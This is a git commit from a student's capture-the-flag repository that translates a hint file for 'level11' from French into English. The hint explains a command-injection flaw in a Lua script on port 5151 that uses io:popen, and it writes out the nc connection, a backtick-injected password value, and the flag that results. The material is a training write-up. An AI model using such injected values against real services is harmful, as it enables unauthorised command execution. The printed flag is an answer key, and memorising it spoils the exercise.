392024afc1104f37dabbcb0ae963f1e352230502
lgarczyn <lgarczyn@student.42.fr>
2019-04-03 22:51:44 +0200

    translated level11

--- level11/Ressources/hint.sh
+++ level11/Ressources/hint.sh
@@ -1,10 +1,10 @@
-# on a ici un script lua qui tourne sur le port 5151 de la machine.
+# we find a script listening to port 5151
+# it uses io:popen to execute a shell command
+# the command doesn't sanitize user inputs
 
-La faille ici est la fonction io:popen() qui execute une commande dans un nouveau shell.
-Comme notre input est donne a cette commande, on a la possibilite de faire une injection de commande.
-
-nc localhost 5151
-Password:`getflag` > /tmp/oui ; echo lol
-cat /tmp/oui
-
-On a le flag du level 12 !
+# connect to server
+nc localhost 5151 # > Password:
+# send evil command
+'`getflag` > /tmp/oui ; echo lol'
+# get flag
+cat /tmp/oui # > fa6v5ateaw21peobuub8ipe6s
